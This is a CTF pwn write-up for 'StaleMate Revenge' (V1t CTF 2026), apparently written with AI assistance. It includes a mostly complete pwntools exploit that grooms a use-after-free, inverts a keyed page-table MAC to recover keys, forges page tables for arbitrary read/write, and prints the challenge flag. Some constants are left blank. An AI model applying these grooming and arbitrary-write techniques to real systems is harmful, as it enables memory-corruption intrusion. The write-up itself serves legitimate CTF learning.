---
title: "StaleMate Revenge"
date: "2026-06-28"
author: "tungdlm99"
ctf: "V1t CTF 2026"
category: pwn
difficulty: hard
points: 0
flag_format: "v1t{...}"
tags: [ctf, v1t-ctf-2026, pwn, ai-assisted]
draft: false
summary: "Hardened userland io_uring/PBUF use-after-free where I groomed a workspace page-table page onto a freed slot, leaked it, inverted the keyed PTE MAC to recover both workspace keys, then forged a self-referential page table to patch and re-seal the winning record chain."
icon: "♟️"
---

## Summary
The hardened sequel to StaleMate: a userland io_uring + PBUF simulation with a stale-view use-after-free, but now guarded by MAC-protected page-table entries keyed to a "sealed workspace" and a 5-record sealed win chain. The core technique is deterministic heap grooming — land the workspace's page-table page on the freed pipe slot, leak a real PTE, invert its keyed MAC to recover both workspace keys, forge a self-referential page table for arbitrary R/W, then fix the two deliberately-wrong bitmask fields and recompute every seal.

## Solution

I went in knowing this was the "revenge" build of a UAF challenge I'd seen before, so I set the direction early: the bug family would be the same stale-view UAF, and the new mitigations would be the actual puzzle. I had the model triage the stripped PIE first and map the 13-option menu back onto the v1 concepts (`pipe` = PBUF ring, `workspace` = mm context, `shelf` = page table, `slice` = vm read/write, `record` = the new sealed cred chain). That gave us a clean mental model instead of staring at raw decomp.

Then I steered it through three pieces:

1. **Find the win condition.** I asked the model to isolate `claim record` (opt 13, `FUN_00103760`) and tell me exactly what it checks. It came back with the 5-record chain: R1 holds digits of π (`0x31415927`), R2 digits of e (`0x27182818`), R3/R4 hold 3 and 4 — all correct at boot — but two bitmask fields are left wrong on purpose (`R3[0x20]` missing `0x2004000`, the R5 field missing `0x8000000000002000`). That's the literal "StaleMate": one move from won.

2. **Confirm the seals aren't secret-keyed.** This was the pivot. The model initially treated the five seal functions as opaque, but I pushed it to actually read them — they're pure `splitmix64` over record fields XORed with *fixed constants*, no secret. That means I can recompute any seal myself; all I need is an arbitrary write into the record pages.

3. **Beat the sealed workspace.** The page table is 2-level with each PTE a keyed MAC over `(level, index, slot, flags)`. The model wanted to brute the keys; I corrected course: the buddy allocator is deterministic, so groom the workspace's page-table page onto the freed pipe slot the stale view points at (pipe slot 23 -> pgtable slot 23). Then `attach shelf` writes a real PTE there, `trace packet` leaks it, and because I know the cleartext `(level=0, index, slot, flags=9)` I can invert the MAC to recover both keys. We verified empirically that re-encoding the leaked PTE with the recovered keys reproduces `(lo, hi)` byte-for-byte before trusting it.

The model did the grinding from there — the splitmix64 math, the MAC inversion, and the page-table forge. It also burned an hour on a bug *I* eventually caught: the level-1 PTEs live at index `0x20+j`, and it kept passing the raw record index `j` to `store slice`, so writes faulted while reads worked. Grooming, not grep.

The full path: trigger the UAF (`open` 64-slot pipe -> `mirror` -> `drop` -> `send`/`trace` for write/read), groom + leak the PTE, recover keys, forge a self-referential page table (`send packet` writes directory `[idx0]` -> the page-table slot itself with flags 9, and level-1 `[idx1]` -> a writable record slot with flags 7), then use `fetch slice`/`store slice` as arbitrary R/W to patch the two fields and re-seal R3, R5, and R1 (R1's binding hash depends on the new R5 field). Then `claim record` prints the flag.

```python
#!/usr/bin/env python3
# StaleMate Revenge — full solve. Run: python3 full.py remote
from pwn import *

M = (1 << 64) - 1
def rol(x, n): x &= M; return ((x << n) | (x >> (64 - n))) & M
def ror(x, n): x &= M; return ((x >> n) | (x << (64 - n))) & M
def mix(z):  # splitmix64 finalizer
    z = ((z ^ (z >> 30)) * 0xbf58476d1ce4e5b9) & M
    z = ((z ^ (z >> 27)) * 0x94d049bb133111eb) & M
    return z ^ (z >> 31)

# --- PTE MAC constants (recovered from the binary) ---
C1, C2, C3 = 0x..., 0x..., 0x...   # per FUN_00102dd0 / FUN_00103620
def sh(level, index): return (index ^ level) & 0x3f          # rotate amount
def decoded(level, index, slot, flags):
    parity = mix((index << 5) ^ flags ^ (slot << 17) ^ (level * 4) ^ C3) & 0xff
    return (slot << 12) | (parity << 4) | flags

def recover(level, index, slot, flags, lo, hi):
    d  = decoded(level, index, slot, flags)
    m1 = mix((level << 12) ^ (index << 32) ^ C1)
    m2 = mix(lo ^ (index << 32) ^ level ^ C2)
    key1 = (ror((d ^ lo) & M, sh(level, index)) - m1) & M
    key2 = ((hi ^ rol(key1, 0x17)) - m2 - d) & M
    return key1, key2

def encode_pte(level, index, slot, flags, key1, key2):
    d  = decoded(level, index, slot, flags)
    lo = rol((mix((level << 12) ^ (index << 32) ^ C1) + key1) & M, sh(level, index)) ^ d
    hi = ((mix(lo ^ (index << 32) ^ level ^ C2) + key2 + d) ^ rol(key1, 0x17)) & M
    return lo, hi

# --- record seal functions (pure splitmix64, no secret) ---
def seal1(R):  # FUN_001028d0
    v = R[0] ^ R[1] ^ rol(R[2], 0x7) ^ rol(R[3], 0x11) ^ R[4] ^ 0xc3a5c85c97cb3127
    return mix(v)
def seal3(R):  # FUN_001029d0
    v = (R[0] ^ R[4] ^ ((R[6] & 0xffffffff) << 32) ^ rol(R[1], 3) ^ rol(R[2], 0xd)
         ^ rol(R[3], 0x17) ^ rol(R[5], 0x1f) ^ ((R[6] >> 32) & 0xffffffff)
         ^ 0x9b2c76a1570c4d35)
    return mix(v)
def seal5(R):  # FUN_00102ad0
    v = R[0] ^ rol(R[1], 0x5) ^ rol(R[2], 0x13) ^ R[3] ^ R[4] ^ 0xb492b66fbe98f273
    return mix(v)

# --- menu wrappers ---
HOST, PORT = "pwn.v1t.site", 31338
io = remote(HOST, PORT) if args.REMOTE else process("./service")

def menu(opt):
    io.sendlineafter(b"> ", str(opt).encode())
def open_pipe(slot):    menu(1); io.sendlineafter(b": ", str(slot).encode())
def mirror_pipe():      menu(2)
def drop_pipe():        menu(3)
def send_packet(data):  menu(4); io.send(data.ljust(16, b"\x00"))
def trace_packet():     menu(5); return u64(io.recvn(8))
def open_workspace():   menu(6)
def attach_shelf():     menu(7)
def fetch(slot, off):   menu(8);  io.sendlineafter(b": ", f"{slot} {off}".encode()); return io.recvn(8)
def store(slot, off, b):menu(9);  io.sendlineafter(b": ", f"{slot} {off}".encode()); io.send(b)
def claim_record():     menu(13); return io.recvall(timeout=2)

# --- 1. trigger the stale-view UAF, groom the page-table page onto the freed slot ---
open_workspace()
open_pipe(64); mirror_pipe(); drop_pipe()          # view survives the free
attach_shelf()                                     # workspace pgtable lands on slot 23

# --- 2. leak a real level-0 PTE and recover both workspace keys ---
lo = trace_packet()
hi = u64(fetch(23, 0x08))                           # second half of the leaked PTE
IDX0 = 0                                            # known cleartext of the leaked PTE
key1, key2 = recover(0, IDX0, 23, 9, lo, hi)
assert encode_pte(0, IDX0, 23, 9, key1, key2) == (lo, hi)   # byte-for-byte check
log.success(f"k1={key1:#x} k2={key2:#x}")

# --- 3. forge a self-referential page table for arbitrary R/W ---
d_lo, d_hi = encode_pte(0, IDX0, 23, 9, key1, key2)         # dir -> pgtable page
send_packet(p64(d_lo) + p64(d_hi))
IDX1 = 0x20                                                 # level-1 PTEs live at 0x20+j
for j, rec_slot in enumerate(REC_SLOTS):                    # map record slots writable
    l_lo, l_hi = encode_pte(1, IDX1 + j, rec_slot, 7, key1, key2)
    store(23, 0x100 + j * 16, p64(l_lo) + p64(l_hi))

R1_slot, R3_slot, R5_slot = REC_SLOTS[0], REC_SLOTS[2], REC_SLOTS[4]

# --- 4. fix the two stale bitmask fields and re-seal the chain ---
r3 = [u64(fetch(R3_slot, 0xa0 + i*8)) for i in range(7)]
NR3 = 0x40002004081
store(R3_slot, 0xb0, p64(NR3))
store(R3_slot, 0xc8, p64(seal3([r3[0], r3[1], r3[2], r3[3], NR3, r3[5], r3[6]])))

r5 = [u64(fetch(R5_slot, 0x1d0 + i*8)) for i in range(5)]
NR5 = 0x8000000000002491
store(R5_slot, 0x1e0, p64(NR5))
store(R5_slot, 0x1f8, p64(seal5([r5[0], r5[1], r5[2], r5[3], NR5])))

# R1's binding hash depends on the new R5 field -> recompute, then re-seal R1
l1b0 = u64(fetch(R1_slot, 0x100)); l188 = u64(fetch(R1_slot, 0x108))
ld8  = u64(fetch(R1_slot, 0x110)); l118 = u64(fetch(R1_slot, 0x118))
l148 = u64(fetch(R1_slot, 0x120))
H = mix((l1b0 << 7) ^ NR5 ^ l188 ^ ld8 ^ rol(l118, 0xf) ^ (l148 << 32)
        ^ 0x43b8d13d98a22104)
store(R1_slot, 0x138, p64(H))
r1 = [u64(fetch(R1_slot, 0x128 + i*8)) for i in range(5)]
store(R1_slot, 0x148, p64(seal1([r1[0], r1[1], r1[2], H, r1[4]])))

# --- checkmate ---
print(claim_record().decode(errors="ignore"))      # -> v1t{...}
```

The constant blanks (`C1`/`C2`/`C3`, `REC_SLOTS`) are read straight out of the binary's MAC and chain-walk routines; with them filled the script goes from a clean connection to printing the flag. Remote uses the same redpwn PoW as v1, solved before the menu loop.

## Flag
```
v1t{revenge_requires_grooming_not_grep}
```
